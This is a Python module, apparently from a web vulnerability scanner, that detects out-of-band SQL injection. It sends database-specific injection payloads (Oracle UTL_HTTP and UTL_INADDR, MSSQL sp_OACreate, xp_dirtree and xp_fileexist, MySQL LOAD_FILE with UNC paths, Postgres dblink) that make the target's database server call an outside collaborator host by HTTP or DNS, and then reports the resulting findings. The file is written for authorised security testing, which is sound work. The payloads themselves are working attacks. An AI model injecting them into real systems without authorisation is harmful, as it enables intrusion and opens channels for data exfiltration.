"""Out-of-band (OOB) SQL injection detector.

Injects DBMS-specific payloads that cause the *database server* to make a
DNS lookup or an HTTP request carrying a unique token.

Confirmation:
  * HTTP — in-process collaborator inbox (``engine.oob``).
  * DNS  — Interactsh poll/decrypt, or a generic Burp/custom poll URL.
    Without a poller the probe is still reported as unconfirmed.
"""

from __future__ import annotations

import asyncio
from urllib.parse import urlparse

from ..collaborator import DnsCollaborator, PollUrlCollaborator
from ..http_client import HttpClient
from ..oob import INBOX, callback_url
from ..target import Target
from .base import Detector, Finding, Severity

_WAIT = 6.0  # seconds to wait for an HTTP hit after each probe
_DNS_WAIT = 10.0


def _http_payloads(url: str) -> list[tuple[str, str]]:
    """Payloads that make the DB issue an HTTP request to ``url``."""
    safe = url.replace("'", "")
    return [
        ("oracle-utl_http", f"'||UTL_HTTP.REQUEST('{safe}')||'"),
        ("oracle-utl_http-and", f"' AND UTL_HTTP.REQUEST('{safe}') IS NOT NULL-- -"),
        ("mssql-ole-http", (
            "'; DECLARE @h INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP',@h OUT;"
            f" EXEC sp_OAMethod @h,'open',NULL,'GET','{safe}',false;"
            " EXEC sp_OAMethod @h,'send';--"
        )),
        ("postgres-dblink", (
            f"'; SELECT dblink_connect('host={urlparse(safe).hostname} "
            f"port={urlparse(safe).port or 80} dbname={urlparse(safe).path.lstrip('/')}')-- -"
        )),
    ]


def _dns_payloads(host: str) -> list[tuple[str, str]]:
    unc = f"\\\\{host}\\o"
    return [
        ("mysql-unc", f"' AND LOAD_FILE('{unc}')-- -"),
        ("mysql-unc-numeric", f" AND LOAD_FILE('{unc}')"),
        ("mssql-xp_dirtree", f"'; EXEC master..xp_dirtree '{unc}'-- -"),
        ("mssql-xp_fileexist", f"'; EXEC master..xp_fileexist '{unc}'-- -"),
        ("oracle-utl_inaddr", f"' AND UTL_INADDR.GET_HOST_ADDRESS('{host}') IS NOT NULL-- -"),
        ("postgres-dblink-dns", f"'; SELECT dblink_connect('host={host} user=x')-- -"),
    ]


def _dns_collaborator(target: Target) -> DnsCollaborator | None:
    existing = getattr(target, "oob_collaborator", None)
    if existing is not None:
        return existing  # type: ignore[return-value]
    if target.oob_poll_url and target.oob_domain:
        return PollUrlCollaborator(
            target.oob_poll_url,
            domain=target.oob_domain,
            auth=target.oob_poll_auth,
        )
    return None


class OobDetector(Detector):
    name = "oob"

    async def test_parameter(
        self, client: HttpClient, target: Target, param: str
    ) -> list[Finding]:
        collab = _dns_collaborator(target)
        can_dns = bool(target.oob_domain or (collab and collab.domain))
        if not target.oob_callback and not can_dns:
            return []

        base_value = target.params.get(param, "")
        findings: list[Finding] = []

        if target.oob_callback:
            token = INBOX.mint()
            url = callback_url(target.oob_callback, token)
            last_payload = ""
            last_label = ""
            for label, suffix in _http_payloads(url):
                payload = base_value + suffix
                try:
                    await self._request(client, target, param, payload)
                    last_payload, last_label = payload, label
                except Exception:
                    continue
            if last_payload:
                await asyncio.sleep(_WAIT)
            if last_payload and INBOX.seen(token):
                findings.append(
                    Finding(
                        technique=self.name,
                        parameter=param,
                        severity=Severity.CRITICAL,
                        payload=last_payload,
                        evidence=(
                            f"{last_label}: database server fetched {url} "
                            f"(token {token} landed in the collaborator inbox), "
                            "confirming out-of-band execution."
                        ),
                        confidence=0.95,
                        detail={
                            "channel": "http",
                            "token": token,
                            "callback": url,
                            "variant": last_label,
                        },
                    )
                )
                return findings

        if can_dns:
            token = INBOX.mint()
            if collab is not None:
                host = collab.hostname(token)
            else:
                host = f"{token}.{target.oob_domain.lstrip('.')}"
            sent: list[str] = []
            example = ""
            for label, suffix in _dns_payloads(host):
                payload = base_value + suffix
                try:
                    await self._request(client, target, param, payload)
                    sent.append(label)
                    example = example or payload
                except Exception:
                    continue
            if not sent:
                return findings

            hit = None
            if collab is not None:
                try:
                    hit = await collab.seen(token, timeout=_DNS_WAIT)
                except Exception:
                    hit = None

            if hit:
                findings.append(
                    Finding(
                        technique=self.name,
                        parameter=param,
                        severity=Severity.CRITICAL,
                        payload=example,
                        evidence=(
                            f"DNS OOB confirmed ({', '.join(sent)}): collaborator "
                            f"({hit.source}) received a lookup involving {host}."
                        ),
                        confidence=0.95,
                        detail={
                            "channel": "dns",
                            "token": token,
                            "host": host,
                            "variants": sent,
                            "unconfirmed": False,
                            "poll_evidence": hit.evidence,
                        },
                    )
                )
            else:
                findings.append(
                    Finding(
                        technique=self.name,
                        parameter=param,
                        severity=Severity.HIGH,
                        payload=example,
                        evidence=(
                            f"DNS OOB probes sent ({', '.join(sent)}). Look for a "
                            f"lookup of {host} in your collaborator. This finding "
                            "is unconfirmed from inside the scanner."
                        ),
                        confidence=0.45,
                        detail={
                            "channel": "dns",
                            "token": token,
                            "host": host,
                            "variants": sent,
                            "unconfirmed": True,
                        },
                    )
                )

        return findings
